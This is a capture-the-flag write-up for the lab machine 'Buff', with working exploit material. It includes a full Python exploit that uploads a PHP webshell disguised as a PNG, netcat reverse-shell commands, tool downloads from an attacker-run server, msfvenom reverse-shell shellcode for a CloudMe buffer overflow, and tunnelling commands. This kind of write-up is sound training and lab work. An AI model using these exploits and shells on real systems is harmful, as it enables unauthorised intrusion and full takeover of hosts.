## Intro


Tags: #windows #WebApp #PortForwarding #OSCPpath #3rd-party-vuln-app #easy

-------
# Reconnaissance

## Port scanning

```shell
sudo nmap -p- --min-rate 3000 -T4 buff.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 16:57 UTC
Nmap scan report for buff.htb (10.129.25.107)
Host is up (0.048s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 44.05 seconds
```

```shell
sudo nmap -p- -sC -sV buff.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 16:58 UTC
Nmap scan report for buff.htb (10.129.25.107)
Host is up (0.047s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.75 seconds
```

## WebApp

### Vulnerable version

```shell
http://buff.htb:8080/
```
found version on Contact page: `Made using Gym Management Software 1.0 `

------
# Foothold

## CVE found 

searchsploit
```shell
└─$ searchsploit gym
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                         | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                      | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution      | php/webapps/48506.py
```
download the one related to RCE
```shell
└─$ searchsploit -m 48506
Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
URL: https://www.exploit-db.com/exploits/48506
Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
Codes: N/A   
Verified: False         
File Type: Python script, ASCII text executable
Copied to: /home/ch3ckm8/48506.py
```

### Shell as shaun

i converted the script above from python2 to python3 
```python
#!/usr/bin/env python3
# Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution
# Exploit Author: Bobby Cooke
# Date: 2020-05-21
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Exploit Tested Using: Python 3.x
# Vulnerability Description:
#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.

import requests
import sys
import re
from colorama import Fore, Back, Style, init

# Initialize colorama for Windows compatibility
init()

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL + 'upload/kamehameha.php'
        getdir = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print(Style.BRIGHT + Fore.RED + "[!] " + Fore.RESET + "Could not connect to the webshell." + Style.RESET_ALL)
            r2.raise_for_status()
        print(Fore.GREEN + '[+] ' + Fore.RESET + 'Successfully connected to webshell.')
        
        # Extract current directory from response
        cwd_match = re.findall(r'[CDEF].*', r2.text)
        if cwd_match:
            cwd = cwd_match[0] + "> "
        else:
            cwd = "$ "
            
        term = Style.BRIGHT + Fore.GREEN + cwd + Fore.RESET
        
        while True:
            thought = input(term)
            if thought.lower() in ['exit', 'quit']:
                print("\nExiting.")
                break
                
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
            
    except KeyboardInterrupt:
        print("\n\rExiting.")
        sys.exit(-1)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT + Fore.RED + STRING + Style.RESET_ALL

def header():
    BL = Style.BRIGHT + Fore.GREEN
    RS = Style.RESET_ALL
    FR = Fore.RESET
    SIG = BL + '            /\\\n' + RS
    SIG += Fore.YELLOW + '/vvvvvvvvvvvv ' + BL + '\\' + FR + '--------------------------------------,\n'
    SIG += Fore.YELLOW + '`^^^^^^^^^^^^' + BL + ' /' + FR + '============' + Fore.RED + 'BOKU' + FR + '====================="\n'
    SIG += BL + '            \/' + RS + '\n'
    return SIG

if __name__ == "__main__":
    print(header())
    
    if len(sys.argv) != 2:
        print(formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0]))
        print(formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0]))
        sys.exit(-1)
    
    # Ensure URL ends with trailing slash
    SERVER_URL = sys.argv[1]
    if not SERVER_URL.endswith('/'):
        SERVER_URL += '/'
    
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    
    print(Fore.CYAN + "[*] " + Fore.RESET + "Target URL: " + SERVER_URL)
    print(Fore.CYAN + "[*] " + Fore.RESET + "Upload URL: " + UPLOAD_URL)
    
    s = requests.Session()
    
    try:
        # Test connection to target
        s.get(SERVER_URL, verify=False, timeout=10)
        print(Fore.GREEN + "[+] " + Fore.RESET + "Successfully connected to target.")
        
        # PNG magic bytes and PHP payload
        PNG_magicBytes = b'\x89\x50\x4e\x47\x0d\x0a\x1a'
        php_payload = b'<?php echo shell_exec($_GET["telepathy"]); ?>'
        
        # Create the file payload
        file_content = PNG_magicBytes + b'\n' + php_payload
        
        # Prepare the multipart/form-data upload
        png = {
            'file': (
                'kaio-ken.php.png',
                file_content,
                'image/png',
                {'Content-Disposition': 'form-data'}
            )
        }
        
        fdata = {'pupload': 'upload'}
        
        print(Fore.CYAN + "[*] " + Fore.RESET + "Uploading malicious PHP file...")
        r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False, timeout=10)
        
        if r1.status_code == 200:
            print(Fore.GREEN + "[+] " + Fore.RESET + "File uploaded successfully!")
            print(Fore.CYAN + "[*] " + Fore.RESET + "Launching webshell...")
            webshell(SERVER_URL, s)
        else:
            print(Fore.RED + "[!] " + Fore.RESET + f"Upload failed with status code: {r1.status_code}")
            print(Fore.RED + "[!] " + Fore.RESET + "Response: " + r1.text[:200])
            
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[!] " + Fore.RESET + "Failed to connect to the target. Please check the URL.")
        sys.exit(-1)
    except requests.exceptions.Timeout:
        print(Fore.RED + "[!] " + Fore.RESET + "Connection timeout. Target might be unreachable.")
        sys.exit(-1)
    except Exception as e:
        print(Fore.RED + "[!] " + Fore.RESET + f"An error occurred: {e}")
        sys.exit(-1)
```
run
```shell
└──╼ [★]$ python 48506.py http://buff.htb:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[*] Target URL: http://buff.htb:8080/
[*] Upload URL: http://buff.htb:8080/upload.php?id=kamehameha
[+] Successfully connected to target.
[*] Uploading malicious PHP file...
[+] File uploaded successfully!
[*] Launching webshell...
[+] Successfully connected to webshell.

C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

```
we are shaun, grabbed user flag:
```powershell
C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

25/02/2026  17:09    <DIR>          .
25/02/2026  17:09    <DIR>          ..
25/02/2026  17:09                53 kamehameha.php
               1 File(s)             53 bytes
               2 Dir(s)   7,781,842,944 bytes free

C:\xampp\htdocs\gym\upload> cd C:\
�PNG
▒

C:\xampp\htdocs\gym\upload> dir C:\
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\

16/06/2020  18:08    <DIR>          PerfLogs
16/06/2020  19:37    <DIR>          Program Files
12/04/2018  09:16    <DIR>          Program Files (x86)
16/06/2020  19:52    <DIR>          Users
18/07/2020  16:35    <DIR>          Windows
16/06/2020  15:40    <DIR>          xampp
               0 File(s)              0 bytes
               6 Dir(s)   7,781,777,408 bytes free

C:\xampp\htdocs\gym\upload> dir C:\Users
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users

16/06/2020  19:52    <DIR>          .
16/06/2020  19:52    <DIR>          ..
21/10/2020  11:35    <DIR>          Administrator
16/06/2020  14:08    <DIR>          Public
16/06/2020  14:11    <DIR>          shaun
               0 File(s)              0 bytes
               5 Dir(s)   7,781,687,296 bytes free

C:\xampp\htdocs\gym\upload> dir C:\Users\shaun
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun

16/06/2020  14:11    <DIR>          .
16/06/2020  14:11    <DIR>          ..
16/06/2020  21:21    <DIR>          3D Objects
16/06/2020  21:21    <DIR>          Contacts
14/07/2020  12:27    <DIR>          Desktop
16/06/2020  21:26    <DIR>          Documents
14/07/2020  12:27    <DIR>          Downloads
16/06/2020  21:21    <DIR>          Favorites
16/06/2020  21:21    <DIR>          Links
16/06/2020  21:21    <DIR>          Music
16/06/2020  16:22    <DIR>          OneDrive
16/06/2020  21:21    <DIR>          Pictures
16/06/2020  21:21    <DIR>          Saved Games
16/06/2020  21:21    <DIR>          Searches
16/06/2020  21:21    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)   7,781,425,152 bytes free

C:\xampp\htdocs\gym\upload> cd C:\Users\shaun\Desktop\user.txt
�PNG
▒

C:\xampp\htdocs\gym\upload> type C:\Users\shaun\Desktop\user.txt

�PNG
▒
d1492c912b1f6f005e3470d242c3dde8

```

### Stabilize shell via netcat

transfer ncat for a more stable shell
```powershell
python3 -m http.server 8001
```

```powershell
curl http://10.10.14.106:8001/nc.exe -o nc.exe
```
now run
```powershell
nc.exe -nv 10.10.14.106 3333 -e cmd.exe
```
got shell back
```powershell
└─$ nc -nvlp 3333                                                                                            
listening on [any] 3333 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.25.107] 49818
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
C:\Users\shaun\Downloads>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1c3
   IPv6 Address. . . . . . . . . . . : dead:beef::b8c0:6085:c6b0:91b6
   Temporary IPv6 Address. . . . . . : dead:beef::8ca1:e8c7:22ea:b37e
   Link-local IPv6 Address . . . . . : fe80::b8c0:6085:c6b0:91b6%10
   IPv4 Address. . . . . . . . . . . : 10.129.25.107
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%10
                                       10.129.0.1

```

-------
# Privesc

## File enumeration

lets start enumerating files
```powershell
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\

16/06/2020  18:08    <DIR>          PerfLogs
16/06/2020  19:37    <DIR>          Program Files
12/04/2018  09:16    <DIR>          Program Files (x86)
16/06/2020  19:52    <DIR>          Users
18/07/2020  16:35    <DIR>          Windows
16/06/2020  15:40    <DIR>          xampp
```

`windows`
```powershell
C:\Windows>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Windows

18/07/2020  16:35    <DIR>          .
18/07/2020  16:35    <DIR>          ..
11/04/2018  23:38    <DIR>          addins
16/06/2020  15:17    <DIR>          appcompat
16/06/2020  18:08    <DIR>          apppatch
21/07/2020  11:45    <DIR>          AppReadiness
16/06/2020  16:58    <DIR>          assembly
18/07/2020  16:35    <DIR>          bcastdvr
11/04/2018  23:34            67,072 bfsvc.exe
11/04/2018  23:38    <DIR>          Boot
11/04/2018  23:38    <DIR>          Branding
14/07/2020  12:12    <DIR>          CbsTemp
16/06/2020  18:08    <DIR>          Containers
16/06/2020  14:09    <DIR>          CSC
11/04/2018  23:38    <DIR>          Cursors
16/06/2020  14:05    <DIR>          debug
11/04/2018  23:38    <DIR>          diagnostics
12/04/2018  09:16    <DIR>          DigitalLocker
16/06/2020  14:05             1,947 DtcInstall.log
12/04/2018  09:16    <DIR>          en-US
07/07/2020  20:35         4,128,320 explorer.exe
11/04/2018  23:38    <DIR>          GameBarPresenceWriter
11/04/2018  23:38    <DIR>          Globalization
12/04/2018  09:16    <DIR>          Help
13/08/2019  09:49         1,060,864 HelpPane.exe
11/04/2018  23:34            17,920 hh.exe
11/04/2018  23:38    <DIR>          IdentityCRL
12/04/2018  09:16    <DIR>          IME
16/06/2020  18:08    <DIR>          ImmersiveControlPanel
25/02/2026  16:57    <DIR>          INF
11/04/2018  23:38    <DIR>          InfusedApps
11/04/2018  23:38    <DIR>          InputMethod
11/04/2018  23:38    <DIR>          L2Schemas
11/04/2018  23:38    <DIR>          LiveKernelReports
25/02/2026  17:05    <DIR>          Logs
16/06/2020  14:04             1,380 lsasetup.log
11/04/2018  23:34            43,131 mib.bin
25/02/2026  17:03    <DIR>          Microsoft.NET
11/04/2018  23:38    <DIR>          Migration
11/04/2018  23:38    <DIR>          ModemLogs
11/04/2018  23:34           245,760 notepad.exe
16/06/2020  16:16    <DIR>          OCR
11/04/2018  23:38    <DIR>          Offline Web Pages
16/06/2020  14:05    <DIR>          Panther
11/04/2018  23:38    <DIR>          Performance
27/10/2020  12:37             8,956 PFRO.log
11/04/2018  23:38    <DIR>          PLA
16/06/2020  18:08    <DIR>          PolicyDefinitions
25/02/2026  17:02    <DIR>          Prefetch
16/06/2020  18:08    <DIR>          PrintDialog
11/04/2018  23:33            36,112 Professional.xml
16/06/2020  18:08    <DIR>          Provisioning
11/04/2018  23:34           336,384 regedit.exe
25/02/2026  16:52    <DIR>          Registration
12/04/2018  09:21    <DIR>          RemotePackages
11/04/2018  23:38    <DIR>          rescache
11/04/2018  23:38    <DIR>          Resources
11/04/2018  23:38    <DIR>          SchCache
12/04/2018  09:21    <DIR>          schemas
12/04/2018  09:21    <DIR>          security
16/06/2020  14:04    <DIR>          ServiceProfiles
11/04/2018  23:38    <DIR>          ServiceState
16/06/2020  18:08    <DIR>          servicing
11/04/2018  23:41    <DIR>          Setup
16/06/2020  18:08    <DIR>          ShellComponents
18/07/2020  16:35    <DIR>          ShellExperiences
12/04/2018  09:17    <DIR>          SKB
16/06/2020  15:14    <DIR>          SoftwareDistribution
11/04/2018  23:38    <DIR>          Speech
11/04/2018  23:38    <DIR>          Speech_OneCore
07/07/2020  20:13           163,840 splwow64.exe
11/04/2018  23:38    <DIR>          System
11/04/2018  23:36               219 system.ini
25/02/2026  16:57    <DIR>          System32
12/04/2018  09:21    <DIR>          SystemApps
12/04/2018  09:21    <DIR>          SystemResources
18/07/2020  16:35    <DIR>          SysWOW64
11/04/2018  23:38    <DIR>          TAPI
16/06/2020  14:04    <DIR>          Tasks
25/02/2026  17:05    <DIR>          Temp
18/07/2020  16:35    <DIR>          TextInput
11/04/2018  23:38    <DIR>          tracing
11/04/2018  23:38    <DIR>          twain_32
11/04/2018  23:34            65,536 twain_32.dll
11/04/2018  23:38    <DIR>          Vss
11/04/2018  23:38    <DIR>          WaaS
11/04/2018  23:38    <DIR>          Web
11/04/2018  23:36                92 win.ini
25/02/2026  16:52               276 WindowsUpdate.log
11/04/2018  23:34            11,776 winhlp32.exe
27/10/2020  12:18    <DIR>          WinSxS
11/04/2018  23:33           316,640 WMSysPr9.prx
11/04/2018  23:34            11,264 write.exe
              19 File(s)      6,517,489 bytes
              74 Dir(s)   7,870,746,624 bytes free
```


`Program Files`
```powershell
C:\Program Files>dir                                                                                                                                                                                    
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Program Files

16/06/2020  19:37    <DIR>          .
16/06/2020  19:37    <DIR>          ..
16/06/2020  14:14    <DIR>          Common Files
16/06/2020  18:08    <DIR>          internet explorer
16/06/2020  19:37    <DIR>          UNP
16/06/2020  14:14    <DIR>          VMware
16/06/2020  18:14    <DIR>          Windows Defender
16/06/2020  18:08    <DIR>          Windows Defender Advanced Threat Protection
11/04/2018  23:38    <DIR>          Windows Mail
16/06/2020  18:08    <DIR>          Windows Media Player
11/04/2018  23:38    <DIR>          Windows Multimedia Platform
11/04/2018  23:38    <DIR>          windows nt
16/06/2020  18:08    <DIR>          Windows Photo Viewer
11/04/2018  23:38    <DIR>          Windows Portable Devices
11/04/2018  23:38    <DIR>          Windows Security
11/04/2018  23:38    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              16 Dir(s)   7,982,886,912 bytes free
```

`Program Files (x86)`
```powershell
C:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Program Files (x86)

12/04/2018  09:16    <DIR>          .
12/04/2018  09:16    <DIR>          ..
11/04/2018  23:38    <DIR>          Common Files
16/06/2020  18:08    <DIR>          Internet Explorer
11/04/2018  23:38    <DIR>          Microsoft.NET
16/06/2020  18:08    <DIR>          Windows Defender
11/04/2018  23:38    <DIR>          Windows Mail
16/06/2020  18:08    <DIR>          Windows Media Player
11/04/2018  23:38    <DIR>          Windows Multimedia Platform
11/04/2018  23:38    <DIR>          windows nt
16/06/2020  18:08    <DIR>          Windows Photo Viewer
11/04/2018  23:38    <DIR>          Windows Portable Devices
11/04/2018  23:38    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              13 Dir(s)   7,986,692,096 bytes free

```

### winPEAS

```powershell
powershell wget http://10.10.14.106:8001/winpeas.bat -o winpeas.bat
```

```powershell
.\winpeas.bat
```


### Listening ports

```powershell
 [+] USED PORTS                                                                                                                                                                                         
   [i] Check for services restricted from the outside                                                                                                                                                   
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       940                                                                                                                              
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                                                                                                
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6812                                                                                                                             
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       8840                                                                                                                             
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       524                                                                                                                              
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1068                                                                                                                             
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1716                                                                                                                             
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2240                                                                                                                             
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668                                                                                                                              
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688                                                                                                                              
  TCP    10.129.25.107:139      0.0.0.0:0              LISTENING       4                                                                                                                                
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       8936                                                                                                                             
  TCP    [::]:135               [::]:0                 LISTENING       940                                                                                                                              
  TCP    [::]:445               [::]:0                 LISTENING       4                                                                                                                                
  TCP    [::]:8080              [::]:0                 LISTENING       8840                                                                                                                             
  TCP    [::]:49664             [::]:0                 LISTENING       524                                                                                                                              
  TCP    [::]:49665             [::]:0                 LISTENING       1068                                                                                                                             
  TCP    [::]:49666             [::]:0                 LISTENING       1716                                                                                                                             
  TCP    [::]:49667             [::]:0                 LISTENING       2240                                                                                                                             
  TCP    [::]:49668             [::]:0                 LISTENING       668                                                                                                                              
  TCP    [::]:49669             [::]:0                 LISTENING       688   
```
i see port 3306 which is `mysql`

### Processes

```powershell
 [+] RUNNING PROCESSES   
...[snip]...
CloudMe.exe                   7152 N/A
...[snip]...
```
there were many systemic/default ones, but this one stood out to me `CloudMe.exe`

alternatively , this could be done via powershell:
```powershell
powershell
```

```powershell
Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess, @{Name="ProcessName";Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} | Format-Table -AutoSize
```

```powershell

LocalAddress  LocalPort OwningProcess ProcessName
------------  --------- ------------- -----------
::                49669           688 lsass      
::                49668           668 services   
::                49667          2240 spoolsv    
::                49666          1716 svchost    
::                49665          1068 svchost    
::                49664           524 wininit    
::                 8080          8840 httpd      
::                 7680          5036 svchost    
::                  445             4 System     
::                  135           940 svchost    
0.0.0.0           49669           688 lsass      
0.0.0.0           49668           668 services   
0.0.0.0           49667          2240 spoolsv    
0.0.0.0           49666          1716 svchost    
0.0.0.0           49665          1068 svchost    
0.0.0.0           49664           524 wininit    
127.0.0.1          8888          2172 CloudMe    
0.0.0.0            8080          8840 httpd      
0.0.0.0            5040          6812 svchost    
127.0.0.1          3306          8936 mysqld     
10.129.25.107       139             4 System     
0.0.0.0             135           940 svchost    
```
can i find sth like a version for this somewhere tho?

#### Vulnerable Version

Looking further on shaun's home dir, i found this
```powershell
C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
```

lets look for exploits regarding this app's version
```shell
└─$ searchsploit cloudme
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                   | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                          | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                          | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                         | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                  | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                           | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                              | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                          | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                 | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                  | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                               | windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
selected the remote one
```shell
└─$ searchsploit -m 48389
  Exploit: CloudMe 1.11.2 - Buffer Overflow (PoC)
      URL: https://www.exploit-db.com/exploits/48389
     Path: /usr/share/exploitdb/exploits/windows/remote/48389.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/ch3ckm8/48389.py
```
do not change the target IP inside, its localhost and we are going to port forward port 8888

### Port forwarding

We will now port forward port 8888, in order to use the exploit

via ligolo
```shell
python3 -m http.server 8001
```
transfer ligolo
```powershell
powershell wget http://10.10.14.106:8001/agent.exe -o agent.exe
```

target
```powershell
.\agent.exe -connect 10.10.14.106:3333 -ignore-cert -retry
```
attacker:
```shell
ifcreate --name buff
```

```shell
ifconfig
```

```shell
route_add --name buff --route 10.129.0.0/16
```

```shell
start --tun buff
```

now lets test it, lets ping the machine
```shell
└─$ ping 10.129.25.107
PING 10.129.25.107 (10.129.25.107) 56(84) bytes of data.
64 bytes from 10.129.25.107: icmp_seq=1 ttl=127 time=188 ms
64 bytes from 10.129.25.107: icmp_seq=2 ttl=127 time=48.3 ms
^C
```
works! lets move on executing the previously found and downloaded exploit

#### Generate shellcode for the poc

```shell
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.106 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload
```

```shell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xd9\xe5\xbd\x50\x50\x4f\xe6\xd9\x74\x24\xf4"
payload += b"\x5b\x29\xc9\xb1\x52\x31\x6b\x17\x83\xc3\x04"
payload += b"\x03\x3b\x43\xad\x13\x47\x8b\xb3\xdc\xb7\x4c"
payload += b"\xd4\x55\x52\x7d\xd4\x02\x17\x2e\xe4\x41\x75"
payload += b"\xc3\x8f\x04\x6d\x50\xfd\x80\x82\xd1\x48\xf7"
payload += b"\xad\xe2\xe1\xcb\xac\x60\xf8\x1f\x0e\x58\x33"
payload += b"\x52\x4f\x9d\x2e\x9f\x1d\x76\x24\x32\xb1\xf3"
payload += b"\x70\x8f\x3a\x4f\x94\x97\xdf\x18\x97\xb6\x4e"
payload += b"\x12\xce\x18\x71\xf7\x7a\x11\x69\x14\x46\xeb"
payload += b"\x02\xee\x3c\xea\xc2\x3e\xbc\x41\x2b\x8f\x4f"
payload += b"\x9b\x6c\x28\xb0\xee\x84\x4a\x4d\xe9\x53\x30"
payload += b"\x89\x7c\x47\x92\x5a\x26\xa3\x22\x8e\xb1\x20"
payload += b"\x28\x7b\xb5\x6e\x2d\x7a\x1a\x05\x49\xf7\x9d"
payload += b"\xc9\xdb\x43\xba\xcd\x80\x10\xa3\x54\x6d\xf6"
payload += b"\xdc\x86\xce\xa7\x78\xcd\xe3\xbc\xf0\x8c\x6b"
payload += b"\x70\x39\x2e\x6c\x1e\x4a\x5d\x5e\x81\xe0\xc9"
payload += b"\xd2\x4a\x2f\x0e\x14\x61\x97\x80\xeb\x8a\xe8"
payload += b"\x89\x2f\xde\xb8\xa1\x86\x5f\x53\x31\x26\x8a"
payload += b"\xf4\x61\x88\x65\xb5\xd1\x68\xd6\x5d\x3b\x67"
payload += b"\x09\x7d\x44\xad\x22\x14\xbf\x26\x47\xe3\xb1"
payload += b"\xdc\x3f\xf1\xcd\x31\x9c\x7c\x2b\x5b\x0c\x29"
payload += b"\xe4\xf4\xb5\x70\x7e\x64\x39\xaf\xfb\xa6\xb1"
payload += b"\x5c\xfc\x69\x32\x28\xee\x1e\xb2\x67\x4c\x88"
payload += b"\xcd\x5d\xf8\x56\x5f\x3a\xf8\x11\x7c\x95\xaf"
payload += b"\x76\xb2\xec\x25\x6b\xed\x46\x5b\x76\x6b\xa0"
payload += b"\xdf\xad\x48\x2f\xde\x20\xf4\x0b\xf0\xfc\xf5"
payload += b"\x17\xa4\x50\xa0\xc1\x12\x17\x1a\xa0\xcc\xc1"
payload += b"\xf1\x6a\x98\x94\x39\xad\xde\x98\x17\x5b\x3e"
payload += b"\x28\xce\x1a\x41\x85\x86\xaa\x3a\xfb\x36\x54"
payload += b"\x91\xbf\x47\x1f\xbb\x96\xcf\xc6\x2e\xab\x8d"
payload += b"\xf8\x85\xe8\xab\x7a\x2f\x91\x4f\x62\x5a\x94"
payload += b"\x14\x24\xb7\xe4\x05\xc1\xb7\x5b\x25\xc0"
```
now take this, and replace it inside `48389.py`

#### or via chisel

chisel
```shell
powershell wget http://10.10.14.106:8001/chisel.exe -o chisel.exe
```

target
```shell
.\chisel.exe client 10.10.14.106:9000 R:8888:127.0.0.1:8888
```
attacker
```shell
chisel server -p 9000 --reverse
```

### Execute poc

attacker:
```shell
python 48389.py 
```

## Shell as Administrator

```powershell
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.25.107] 49690
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

C:\Windows\system32>cd C:\Users\Administrator\Desktop\root.txt
cd C:\Users\Administrator\Desktop\root.txt
The directory name is invalid.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
c12409e2578262d86c66ab6a65c68c09
```
for some reason it worked only via pwnbox, keep in mind that sometimes VMs break so either keep snapshots or reinstall vm.

--------
# Summary



-----------
# Sidenotes